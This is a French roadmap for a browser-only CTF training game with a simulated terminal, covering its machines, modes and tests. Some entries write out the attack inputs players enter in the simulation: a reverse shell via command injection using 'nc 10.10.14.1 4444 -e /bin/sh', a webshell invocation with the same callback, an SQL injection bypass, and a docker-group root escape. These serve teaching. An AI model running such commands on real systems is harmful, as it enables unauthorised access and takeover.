# 🗺️ Roadmap — CTF Lab

Tout ce qui a été envisagé comme piste d'amélioration, du plus petit détail au chantier le
plus ambitieux — **en restant strictement dans le cadre du projet de base : terminal simulé
en vanilla JS, sans dépendance, 100% côté client (aucun backend, aucune API externe).**
Rien n'est fait pour l'instant au-delà de la v1 (3 machines, moteur terminal, scoring,
indices à paliers).

> 💡 Pour ajouter une idée : `- [ ]` dans la section qui correspond. Coche-la (`- [x]`) une
> fois livrée.

---

## 🎯 Prochaines priorités (recommandation, ordre effort/valeur croissant)

Vue synthétique de ce qui reste ouvert et vaudrait le coup d'être attaqué ensuite, en
plus de ce qui vient d'être livré dans les dernières passes (`vim`, `nc` bannière + écoute,
reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :

1. **i18n FR/EN** (Phase 3) — gros chantier transverse, à faire une fois le contenu FR
   stabilisé (sinon double la charge de maintenance à chaque nouvelle machine). **Dernier
   item de Phase 3 encore ouvert.**

> ✅ **Phase 2 entièrement terminée** (STRATUS cloud / NEXUS webshell / CITADEL pivot / TEMPEST cloud-RCE, 8 → **12
> machines**). **Phase 3 quasi bouclée** : solveur automatique (`tools/solve.js`), extraction
> JSON pure des machines (`tools/export-machines-json.js` → `machines.json`) et **vrai parser
> shell** (`$VAR`, `$(...)`, redirections `2>`/`&>`) livrés. Il ne reste que l'i18n FR/EN.

---

## ✅ Déjà fait (v1)

- Moteur de terminal vanilla JS (FS virtuel, pipes basiques : grep/sort/wc/head/tail/cut/awk)
- 3 machines complètes (recon → accès → privesc → flag) : NIMBUS (facile), CERBERUS (moyen),
  OBSIDIAN (difficile)
- 3 classes de privesc couvertes : sudo GTFOBins, cron job world-writable, binaire SUID
- Indices à 3 paliers par étape, score, sauvegarde `localStorage`, déblocage progressif

---

## ✅ Phase 1 — Petits trucs, gros rapport effort/valeur (terminée)

- [x] **Autocomplétion Tab** — commandes connues + chemins du FS courant
- [x] **Historique persistant** — actuellement remis à zéro au reload (`localStorage` au lieu
      de `SESSION.history` en mémoire)
- [x] **`Ctrl+L`** pour clear en plus de la commande `clear`
- [x] **Bouton "copier le flag"** au clic sur un flag affiché dans le terminal
- [x] **`reset <machine>`** — permet de rejouer une machine déjà terminée sans tout recharger
- [x] **Chrono par machine** — affichage du temps passé (façon speedrun), stocké dans la save
- [x] **Messages d'erreur plus réalistes** — code de sortie `$?`, `bash: commande : command
      not found` avec le vrai style bash, `sudo` qui compte les tentatives avant lockout
- [x] **`man <commande>`** — vraies pages de manuel courtes pour chaque commande simulée
      (actuellement un message générique)
- [x] **Thème clair / alternatif** — au moins un 2e thème en plus du thème sombre actuel
- [x] **Petit son discret (optionnel, toggle)** à la capture d'un flag

## 📚 Phase 2 — Contenu (plus de machines, plus de variété)

- [x] **Monter à 8-10 machines** avec une vraie courbe de difficulté (Facile → Moyen →
      Difficile → Insane) — objectif dépassé : **12 machines**, avec en plus STRATUS (cloud
      public), NEXUS (upload de webshell), CITADEL (pivot interne) et TEMPEST (bucket de
      déploiement inscriptible → RCE). L'ordre du tableau reste la courbe de déblocage, AXIOM
      (Insane) demeure le final narratif.
- [x] **Cloud inscriptible → RCE (`cloudctl cp`)** — au-delà du bucket public en lecture
      (STRATUS), un bucket `writable` marqué `deploy` voit son contenu exécuté automatiquement
      par le pipeline CI : `cloudctl cp <payload> s3://<bucket>/`, avec une écoute `nc -lvnp`
      préalable, déclenche un callback et ouvre un accès (machine **TEMPEST**). Testé dans
      `tests/run.js` (écriture refusée sur un bucket lecture seule, cp sans écoute sans effet,
      cp + écoute → accès).
- [x] **Nouvelles familles de vulnérabilités**, toujours simulées (pas de vrai service qui
      tourne) :
      - [x] Web : faux login vulnérable à une injection SQL simplifiée (`curl -d`, bypass
        `' OR '1'='1'`), LFI simulée via un paramètre `?page=` → machine **PHANTOM**
      - [x] Un mode `cmd`/PowerShell simulé (`dir`, `type`, `net`, `schtasks`, `icacls`) pour
        une machine "Windows", privesc via tâche planifiée SYSTEM world-writable → machine
        **GLACIER**
      - [x] Un mini scénario conteneur simulé — commande `docker ps` en dur (pas de vrai
        Docker) + privesc via appartenance au groupe `docker` (`docker run -v /:/mnt --rm -it
        alpine chroot /mnt sh`) → machine **AXIOM**
- [x] **Machines en pivot** — livré via **CITADEL** (`internal: true`, `pivot: { via, pivotIp }`).
      L'hôte interne (172.16.20.10) n'est pas routable directement : `nmap`/`ssh`/`curl` sur son IP
      renvoient "hôte interne, non routable". Il faut d'abord rooter le pivot (**NEXUS**), y lire
      `/root/infra_notes.txt` (IP interne + creds), puis ouvrir un tunnel simulé
      `ssh -L <lport>:172.16.20.10:22 root@<nexus>` — le moteur exige que le pivot soit rooté et
      pose `SESSION.tunnel`, ce qui rend l'hôte interne joignable. Chaîne d'attaque multi-hop
      complète (NEXUS → CITADEL). Testé dans `tests/run.js` (injoignable sans tunnel, tunnel refusé
      si pivot non rooté, exploitation complète après pivot) et rejoué par `tools/solve.js` (deps).
- [x] **Mode "Insane / sans indices"** — commande `insane on`, pour les joueurs qui veulent un
      run tendu dès le départ : `hint`/`chint` refusent, score multiplié par 1.5 sur toute la
      partie. Verrouillé à une sauvegarde neuve (score à 0, rien de commencé) pour éviter toute
      incohérence de scoring en cours de route — pas de bascule libre en milieu de partie comme
      envisagé à l'origine, choix assumé pour la fiabilité du score.
- [x] **Mode Jeopardy en plus du mode boîte** — mini-challenges indépendants (crypto basique,
      forensics léger, misc) via `challenges`/`challenge <id>`/`chint <id>`/`submit <id> <flag>`,
      score unifié avec le mode boîte. 5 défis pour l'instant (César, Base64 imbriqué, XOR à clé
      unique, casseur de hash, acrostiche) — encore extensible
- [x] **Défi du jour** — commande `daily`, seed = date du jour (calculée en JS pur) qui met en
      avant un des défis Jeopardy existants. *Reste ouvert* : varier aussi les machines en mode
      boîte (pool de vulnérabilités), pas seulement les défis Jeopardy
- [x] **Write-up auto-généré** — une fois une machine terminée, `writeup <machine>` génère un résumé
      pédagogique (recon, accès, privesc, flags) à partir des données de la machine et de la
      progression sauvegardée ; `--download` l'exporte en fichier `.md`
- [x] **Badges/succès** — 🎯 "0 indice utilisé" et ⚡ "moins de 5 minutes" par machine, plus
      🏆 "perfectionniste" et 🌐 "tour complet" en global (commande `badges`, sidebar).
      Variante simplifiée de l'idée d'origine : pas de badge "toutes les machines en une
      session" (nécessiterait de tracker un id de session) — piste encore ouverte.
- [x] **`vim` minimal** — un mini-éditeur modal (`vim`/`vi`/`nano`) à la place du seul `echo >>`
      pour éditer des fichiers : insertion ligne par ligne, `:wq` (enregistrer + quitter),
      `:q!` (quitter sans sauver), `:show` (revoir le buffer). Fonctionne en local (attaquant)
      et sur les machines cibles ; la détection du payload de privesc cron/schtask
      (CERBERUS, GLACIER) a été rendue générique (basée sur le contenu du script plutôt que
      sur la commande exacte tapée) pour que `vim` soit une alternative à part entière à
      `echo '...' >> script.sh`, testé dans `tests/run.js`.
- [x] **`nc` (netcat) simulé** — client (`nc <ip> <port>`, bannière brute) **et** écoute
      (`nc -lvnp <port>`) livrés. Le vrai bind/reverse shell manuel fonctionne maintenant sur
      **MERIDIAN** : `SESSION.listening` retient le port en écoute côté attaquant, et le
      endpoint `/report` (déjà vulnérable en LFI pour l'accès "normal") exécute en réalité le
      paramètre `file` sans échappement — en écoutant sur le bon port puis en déclenchant
      `curl "http://.../report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh"`, le joueur
      obtient le même accès initial que via ssh, mais par injection de commande plutôt que
      fuite d'identifiants. C'est un chemin **bonus, non nécessaire** (les indices ssh restent
      la voie principale ; un 4ᵉ indice optionnel révèle le chemin reverse shell). L'IP
      attaquante est fixe (`ATTACKER_IP = "10.10.14.1"` dans `machines.js`) et le port fixe
      (4444) — pas encore une vraie "modélisation réseau" générique, mais un cas concret qui
      prouve le concept sans backend ni vrai socket. Testé dans `tests/run.js` (refus sans
      écoute, refus sur le mauvais port, accès + crédit du score une seule fois même en
      repassant par ssh ensuite).
- [x] **`nc`/reverse shell généralisé** — le mécanisme n'est plus câblé sur MERIDIAN : le
      schéma `machine.altAccess` est passé de `{ triggerPath, port, user }` (chaîne exacte +
      port fixe) à `{ path, injectRegex, user }`. Le moteur (`cmdCurl`) détecte l'injection de
      commande sur l'endpoint (`path` + `injectRegex` sur la query), **parse l'IP et le port du
      callback depuis le payload du joueur** (au lieu de valeurs codées en dur), exige que l'IP
      soit celle de l'attaquant (`ATTACKER_IP`) et que le port corresponde à l'écoute
      (`nc -lvnp <port>`) — le joueur choisit donc librement son port. Réutilisé tel quel sur
      une 2ᵉ machine, **PHANTOM** (injection via le même paramètre `?page=` que sa LFI), pour
      prouver la généricité. Testé dans `tests/run.js` (port variable 9001, rejet d'une mauvaise
      IP de callback, LFI normale non confondue avec une injection, exploitation complète de
      PHANTOM par ce chemin).
- [x] **Chapitre "upload de webshell"** — livré via **NEXUS**. Formulaire mal filtré
      (`machine.upload = { formPath, filenameRegex, webshellPath, user }`) : `curl -F "file=@shell.php"`
      accepte un `.php` déguisé (le filtre ne regarde que l'extension) et révèle le chemin du
      webshell. Ce webshell exécute son paramètre `cmd` → réutilise le mécanisme `altAccess`
      généralisé (avec le drapeau `requiresUpload: true` qui renvoie un 404 tant que rien n'a été
      uploadé) : en écoutant `nc -lvnp <port>` puis en déclenchant
      `curl ".../uploads/sh.php?cmd=nc 10.10.14.1 <port> -e /bin/sh"`, le joueur obtient un shell
      www-data. Second cas d'usage concret du reverse shell généralisé. Testé (404 sans upload,
      fichier non-php refusé, upload + reverse shell OK).
- [x] **Machine "mauvaise configuration cloud"** — livré via **STRATUS** + la commande `cloudctl`
      (fausse CLI de stockage objet, 100% en dur, aucun SDK). `cloudctl ls` liste les buckets,
      `cloudctl ls s3://<bucket>` liste le contenu (AccessDenied si privé), `cloudctl get s3://.../<clé>`
      télécharge un objet, `cloudctl cp` téléverse (si le bucket autorise l'écriture publique). Le
      bucket `stratus-prod-backups` est public en lecture et fuite un `deploy.env` avec des creds SSH
      → accès. Testé (bucket public listé/lu, bucket privé refusé en ls et get).

## 🔧 Phase 3 — Technique / fiabilité

- [x] **Suite de tests unitaires du moteur** — `tests/run.js` (Node, zéro dépendance) : parsing
      et pipes, exploit complet des 12 machines (recon → accès → privesc → 2 flags), cohérence
      du score, remboursement de `reset`, résolution des défis Jeopardy, mode Insane, éditeur
      `vim` (création/édition/`:q!`, alternative à `echo >>` pour le privesc cron), bannière
      `nc`, cloud (`cloudctl`), upload de webshell et pivot `ssh -L`. 167 assertions au total. Lancer avec `node tests/run.js`. A déjà détecté plusieurs
      erreurs de séquence de commandes pendant son écriture — utile.
- [x] **Vrai parser shell** — nouveau lexer/parser dans `engine.js` (`parseWords` +
      `runPipelineCore`) : guillemets simples/doubles imbriqués et concaténés, **variables**
      intégrées `$USER`/`$HOME`/`$PWD`/`$HOSTNAME`/`$UID`/`$?` et `${VAR}` (développées hors
      guillemets simples, variable inconnue = ""), **substitution de commande** `$(...)`
      (récursive, sans effet de bord d'historique/scan de flag), et **redirections** `>` `>>`
      `2>` `&>` `2>&1` `2>/dev/null` gérées de façon centralisée (`splitRedirects` +
      `applyRedirects`), la logique d'écriture fichier d'`echo` (avec le plant cron/schtask)
      étant factorisée dans `writeStdoutToFile`. Le découpage des pipes respecte guillemets et
      `$(...)`. *Choix assumé* : les backslash restent littéraux (pas d'échappement bash) car les
      chemins Windows des machines cibles (`C:\Scripts\...`) en dépendent, et les variables sont
      en lecture seule (`export` est déjà une commande du jeu). Les 167 tests + le solveur passent
      inchangés (aucune régression sur les chemins d'exploit).
- [x] **Versioning de la sauvegarde** — `SAVE_VERSION` explicite + `sanitizeGameState()` centralise
      toutes les migrations (badges, bestTimes, jeopardy, insaneMode...) et normalise n'importe
      quel objet GAME partiel/étranger vers un état sûr. Réutilisé à la fois par le chargement
      normal (`localStorage`) et par l'import de sauvegarde chiffrée (ci-dessous), au lieu de
      deux logiques de migration séparées.
- [x] **Machines déclaratives (JSON pur)** — deux briques livrées :
      1. `validateMachines(MACHINES)` (dans `machines.js`) fait office de "petit schéma maison"
         (id/ip uniques, ports bien formés, `privesc.type` connu, `targetFS`/`rootFile`/`hints`
         présents, forme d'`altAccess`), lancé au chargement et testé dans `tests/run.js`.
      2. **Extraction réelle en JSON pur** via `tools/export-machines-json.js` : sérialise
         `MACHINES` en `machines.json` à la racine, en encodant les seules valeurs non-JSON (les
         RegExp des exploits) sous la forme balisée `{ "__regex__": source, "__flags__": flags }`,
         reconstructible au chargement. Round-trip garanti (re-parse + reconstruction des regex →
         re-sérialisation identique). Mode `--check` (CI) qui échoue si `machines.json` a dérivé
         de `machines.js`. Le runtime continue d'utiliser le littéral JS (choix assumé : c'est ce
         qui permet d'ouvrir `index.html` en `file://` sans serveur, un `fetch` de `.json` y
         échouerait) — mais la donnée est désormais prouvée 100% JSON-sérialisable et disponible
         en fichier `.json` séparé (utile pour l'éditeur de machines de la Phase 4).
- [x] **Solveur automatique local** — `tools/solve.js` (Node, dev only, jamais embarqué dans
      le jeu) charge le moteur dans un contexte vm isolé et rejoue la solution officielle de
      chaque machine, en vérifiant les 5 jalons (recon/access/privesc/userFlag/rootFlag) et que
      le flag root récupéré correspond bien à `machine.rootFile.content`. Code de sortie non-nul
      si un chemin d'exploit casse. Options : `--verbose` (chaque commande + sortie du moteur),
      `--walkthrough` (pas-à-pas propre), `--machine <id>` (une seule machine). Complémentaire
      de `tests/run.js` : ici c'est un smoke test dédié aux chemins d'exploit + générateur de
      walkthrough.
- [x] **PWA installable** — manifest + service worker (toujours vanilla) pour jouer hors-ligne
- [ ] **i18n FR/EN** — actuellement tout est codé en dur en français

## 🚀 Phase 4 — Chantiers ambitieux, toujours 100% client / vanilla JS

- [x] **Éditeur de machines intégré au jeu** — bouton 🛠️ (ou lien `index.html#editor`) qui
      ouvre une modale « Créer une machine » : un textarea JSON (pré-rempli d'un modèle valide),
      « Valider & charger » et « Télécharger .json ». Côté moteur, `loadCustomMachine()` compile
      les regex (chaînes ou `{ __regex__ }`), passe la machine dans `validateMachines`, vérifie
      l'absence de collision d'id/ip, puis l'injecte dans `MACHINES` (déverrouillée, marquée
      `custom` → exclue des badges « tour complet »/« perfectionniste », non persistée = bac à
      sable). La machine est alors **pleinement jouable** dans le vrai terminal (nmap → accès →
      privesc → flags), et exportable en `.json` à glisser dans `machines.js`. Testé dans
      `tests/run.js` (JSON invalide, schéma incomplet, collision d'id, chargement valide +
      exploitation complète) et vérifié au rendu (headless).
- [x] **Générateur procédural local** — `generateMachine(seed)` (dans `engine.js`), 100% JS pur
      (PRNG mulberry32 seedé, aucune IA), combine une **brique de vecteur d'accès** (FTP anonyme /
      fuite de config web / bucket cloud public) et une **brique de privesc** (sudo GTFOBins
      `less`/`env`/`perl`) tirées de pools pour produire une machine **valide et garantie jouable**
      (chaque brique fournit aussi ses étapes de solution). Déterministe : même seed → même machine
      (donc partageable/reproductible via le lien de partage). Exposé via la commande **`generate
      [seed]`** (génère + charge + déverrouille) et le bouton **🎲 Générer** de l'éditeur. Testé dans
      `tests/run.js` (déterminisme, conformité au schéma et exploitation complète sur 5 seeds, +
      la commande).
- [x] **Partage de scénario par URL** — une machine custom s'encode en **base64url** (UTF-8,
      100% ECMAScript, sans `btoa`, donc testable en Node) dans le hash de l'URL via
      `encodeScenario()`/`decodeScenario()` (dans `engine.js`). Le bouton **« Lien de partage »**
      de l'éditeur génère `index.html#machine=<token>` et le copie ; à l'ouverture d'un tel lien,
      la machine est décodée, validée (`loadCustomMachine`) et chargée automatiquement — jouable
      immédiatement, sans backend. Testé dans `tests/run.js` (round-trip UTF-8, sortie URL-safe,
      chargement depuis token + exploitation complète, token corrompu géré) et vérifié au rendu
      (headless). *Reste ouvert* : le partage d'une **session/replay** complet (pas seulement
      d'une machine).
- [x] **Replay local rejouable** — chaque commande soumise et sa sortie sont enregistrées
      (`RECORDING` dans `app.js`) ; le bouton **▶️** ou la commande **`replay`** ouvrent un overlay
      qui **rejoue** la session façon asciinema (animation de frappe + sorties), **sans
      ré-exécuter** aucune commande — la progression réelle n'est donc jamais modifiée. Le replay
      s'exporte en `.json` (`replay save` ou bouton) et se recharge (« Charger un replay ») pour
      être rejoué plus tard ou partagé. Aucune dépendance, tout en Canvas/DOM. Vérifié au rendu
      (headless) : frappe animée, sorties fidèles, « fin du replay ».
- [x] **Mode bac à sable libre** — commande **`sandbox`** (ou bouton **🧪**) : monte une session
      `hacker@sandbox` avec un FS **entièrement personnalisable** (map plate `{ "chemin": "contenu" }`,
      via `mountSandbox`), **sans machine, sans flag, sans scoring** (ctx attaquant → aucun scan de
      flag). On s'y entraîne librement aux commandes (`ls`, `cd`, `cat`, `find`, `grep`, `cut`,
      `awk`, `wc`, `vim`, pipes…). Un FS de démo est fourni ; la modale 🧪 laisse coller son propre
      FS JSON. `sandbox reset` (ou `exit`) revient sur la machine kali. Testé dans `tests/run.js`
      (FS de démo + custom, pipes, aucune modification du score, sortie) et vérifié au rendu. *(Au
      passage : bug corrigé — `ls` sans argument listait le home au lieu du répertoire courant.)*
      custom (JSON collé par l'utilisateur) pour s'entraîner aux commandes sans notion de
      flag ni de scoring
- [ ] **Vrai mini-langage de script pour les exploits** — remplacer les regex ad-hoc de
      `privesc` par un petit DSL interne (toujours vanilla JS, interprété maison) décrivant
      les conditions d'exploitation, pour rendre l'ajout de nouvelles classes de vulnérabilité
      (au-delà de sudo/cron/SUID) plus simple sans toucher au moteur

## 🤯 Phase 5 — Idées de fou malade (toujours 100% vanilla JS, sans dépendance, sans backend)

- [ ] **Attack graph non-linéaire** — remplacer le chemin figé recon → accès → privesc par un
      vrai graphe de dépendances par machine (plusieurs vulnérabilités d'entrée possibles,
      plusieurs chemins de privesc), avec un rendu SVG interactif du graphe découvert au fur
      et à mesure que le joueur avance (nœuds "grisés" tant qu'ils ne sont pas atteints)
- [ ] **Sous-réseau simulé multi-hôtes** — un faux `nmap 10.10.10.0/24` qui révèle plusieurs
      IP d'un coup, table ARP simulée, et un faux `proxychains`/pivot pour router les commandes
      d'une machine compromise vers une machine interne — version "réseau" plus poussée de
      l'idée pivot déjà en Phase 2
- [x] **Mode Blue Team** — 3 incidents (`BLUE_INCIDENTS`, tout en dur) où le joueur reçoit un
      dump de logs (auth.log brute-force SSH, access.log Nginx LFI/path-traversal, scan sqlmap) et
      répond à des questions façon SOC (IP attaquante, compte/fichier compromis, heure, technique).
      Commandes **`blueteam`** (liste), **`incident <id>`** (scénario + logs + questions),
      **`answer <id> <question> <valeur>`** (réponse tolérante : normalisation casse/espaces +
      plusieurs formulations acceptées), **`bthint <id> <question>`** (indice). Points par incident
      résolu (via `addScore`, donc soumis au ×1.5 du mode Insane), badge **🛡️ Analyste SOC** quand
      tout est résolu, bouton `blueteam` dans la quickbar. Testé dans `tests/run.js` (liste,
      affichage, mauvaise réponse, indice, résolution complète + normalisation, score, badge, pas de
      double crédit) et vérifié au rendu.
- [ ] **Visualiseur de stack pédagogique** — pour une machine "buffer overflow" 100% simulée :
      un schéma animé de la pile (petits blocs mémoire) qui montre comment un `payload` fourni
      par le joueur écrase l'adresse de retour, sans jamais exécuter de code réel — but purement
      pédagogique, aucune primitive d'exploitation binaire réelle
- [x] **Casseur de hash simulé** — commande `hashcat <hash>` / `hashcat --list` en JS pur, contre
      une wordlist embarquée. Utilise un algorithme maison fictif ("hash-VX", pas un vrai MD5/SHA1)
      pour rester clairement pédagogique — intégré au défi Jeopardy "Mot de passe recyclé"
- [ ] **Arbre de compétences façon RPG** — XP gagnée par machine/catégorie (recon, exploitation,
      privesc, forensic) qui débloque progressivement des commandes ou options avancées
      (ex: `nmap -sV`, `awk` avancé) plutôt que tout disponible dès le début.
      *Première brique posée* : le score se traduit déjà en niveau/barre XP dans l'en-tête
      (`levelInfo()` dans `engine.js`) — il manque encore le déblocage de commandes par palier.
- [ ] **Mini reverse engineering** — un faux binaire "malware" à analyser avec un `strings`
      simulé et un désassembleur ultra-simplifié maison (mnémoniques inventés ou x86 minimal
      en dur, pas un vrai moteur de désassemblage) pour un chapitre forensic/malware
- [ ] **Terminal multi-panes façon tmux** — split horizontal/vertical simulé au sein d'un même
      onglet (un pane shell, un pane logs qui défile) pour les machines plus avancées
- [ ] **Mode "fantôme" sur le replay** — en s'appuyant sur le replay local déjà prévu en Phase 4 :
      importer le replay d'un run (le sien ou un fichier partagé) et le rejouer en parallèle du
      run courant façon "ghost" speedrun, sans aucun serveur ni classement en ligne
- [ ] **Hot-seat local** — plusieurs profils de joueur sur le même navigateur/écran, qui jouent
      à tour de rôle sur la même session de machines avec un classement local comparatif —
      explicitement pas de multijoueur réseau, juste plusieurs saves locales comparées
- [x] **Accessibilité poussée** — thème contraste élevé, cartes de machines navigables au clavier
      (Tab + Entrée), `role="log"`/`aria-live` sur le terminal, `aria-label` sur l'input et les
      badges. *Reste ouvert* : compatibilité lecteur d'écran plus poussée sur le pager (`!sh`) et
      les toasts.

## 🌀 Phase 6 — Encore plus loin (vague 2)

- [x] **Lore transversal** — un fil narratif léger reliant les machines (une auditrice interne,
      R. Kade, disparaît en pleine investigation d'une fraude chez "Solenne Holdings" ; un fichier
      `note_interne.txt` par machine avance discrètement l'histoire, jusqu'à un journal final sur
      AXIOM). Aucun impact sur le gameplay — pur easter egg dans les données de `machines.js`.
- [x] **Mini-challenges crypto en Jeopardy** — César, XOR à clé unique et Base64 imbriqué sont
      livrés (voir Phase 2). Un RSA jouet avec petits nombres (factorisation de n=3233, `BigInt`
      pour reproduire les calculs) est également livré (`rsatoy`, catégorie Crypto).
- [x] **Stéganographie simulée** — un faux fichier image avec des métadonnées "EXIF" cachées
      dans un objet JS (pas de vrai binaire image à parser), pour un mini-challenge forensic :
      livré en Jeopardy (`exifhidden`, catégorie Forensics — un champ `UserComment` inversé
      cache le flag).
- [x] **API REST vulnérable simulée** — un faux endpoint `/api/users/<id>` en dur avec IDOR
      simulé (changer l'`id` révèle des données d'un autre "utilisateur" fictif, dont un mot de
      passe admin) : déjà livré via la machine **VORTEX** (voir Phase 2).
- [x] **Ambiance sonore procédurale** — un fond sonore généré par oscillateurs Web Audio API
      (pas de fichier audio à charger, donc zéro dépendance), différent par machine selon la
      difficulté, avec toggle marche/arrêt (bouton 🎧 dans l'en-tête, désactivé par défaut) — à
      ne pas confondre avec le petit son de capture de flag déjà prévu en Phase 1, ici c'est une
      ambiance continue qui change de preset selon la machine courante.
- [ ] **Time machine de session** — undo/redo de l'état du FS courant à l'intérieur d'une
      machine (pas du game state global), pour explorer/tester des commandes destructrices
      sans avoir à tout recharger

⚠️ **Idée évoquée puis écartée dans cette vague** : un export "rapport de pentest en PDF".
Impossible à faire proprement en vanilla JS sans lib externe type jsPDF (contredit le
principe zéro-dépendance) — alternative conforme au cadre : une page dédiée avec une feuille
de style `@media print`, générée et stylée en interne, exportée via le `window.print()` /
"Enregistrer en PDF" natif du navigateur. Cette alternative est ajoutée ci-dessus dans une
future revue si tu valides le principe.

## 🎆 Phase 7 — Encore plus loin (vague 3)

- [x] **Firewall simulé en CLI** — 2 scénarios (`FIREWALL_SCENARIOS`) où l'on lit et modifie un
      jeu de règles façon `iptables` pour atteindre des objectifs (durcir : n'ouvrir que 80/443 +
      SSH LAN-only ; bloquer un attaquant sans couper le web). Moteur de règles maison (évaluation
      1re-correspondance-gagne + policy par défaut, matching IP/CIDR, proto, port) : `firewall`
      (liste), `firewall <id>` (démarre + affiche règles + checklist d'objectifs), `iptables -L`,
      `-A`/`-I`/`-D`, `-P <chaîne> ACCEPT|DROP`, `-F`. Les objectifs se cochent en direct ; tout
      valider résout le scénario (points + badge **🧱 Ingénieur réseau**). Le 2ᵉ scénario enseigne
      l'**ordre des règles** (il faut `-I` pour insérer le DROP avant la règle ACCEPT). Purement
      textuel, aucun vrai pare-feu. Testé dans `tests/run.js` (résolution des 2 scénarios, leçon
      d'ordre, score, badge, garde hors-scénario) et vérifié au rendu.
- [x] **Fiche CVE/CVSS pédagogique** — à chaque flag root capturé, une petite fiche
      récapitulative façon CVE fictive s'affiche dans le terminal (CVE générée localement,
      score/vecteur CVSS mappés au type de privesc de la machine)
- [ ] **Mini chapitre phishing** — analyser un faux mail (en-têtes simulés, lien suspect,
      domaine usurpé) pour repérer les indicateurs d'une tentative de phishing, en
      complément du mode Blue Team (Phase 5) mais côté "boîte mail" plutôt que logs serveur
- [x] **Narration vocale des indices** — lecture à voix haute des indices/messages via l'API
      native `SpeechSynthesis` du navigateur (zéro dépendance, zéro fichier audio), togglable
      via le bouton 🗣️ dans l'en-tête (désactivé par défaut). Lit les indices (`hint`/`chint`)
      et les messages importants (flags capturés, badges débloqués, machine débloquée) — jamais
      les listings bruts (`ls`, `cat`, `nmap`...).
- [x] **Export/import de sauvegarde chiffrée** — `export <passphrase>` télécharge un
      `.json.enc` (AES-GCM, clé dérivée par PBKDF2-SHA256 via l'API native `Web Crypto`,
      zéro dépendance), `import` ouvre un sélecteur de fichier puis demande la passphrase.
      Permet de transférer sa progression d'un navigateur à l'autre sans backend.
- [x] **Catégories de speedrun** — en plus du chrono simple par machine (Phase 1), la commande
      `records` compare les meilleurs temps locaux par catégorie ("Any%", "Sans indice", "Premier
      essai sudo") dans un petit tableau stocké en local (`GAME.bestTimes`)
- [x] **Effet visuel de capture de flag** — explosion de particules en Canvas pur au moment
      où le flag root est validé, togglable via le bouton ✨ (FX) dans l'en-tête, avec en
      prime un mode glow/scanlines sur tout le terminal quand les FX sont actives

---

## ❌ Explicitement hors cadre

Des idées plus grosses ont été évoquées à tort dans une version précédente de ce fichier —
elles contredisent le principe de base (vanilla JS, sans dépendance, 100% client) et ne
seront pas poursuivies sauf si tu changes explicitement les règles du projet : un vrai
noyau Linux compilé en WASM, un vrai backend avec de vrais conteneurs Docker par joueur, un
mode multijoueur réseau temps réel, un générateur de machines par IA externe, ou une
distribution en CLI/npx.
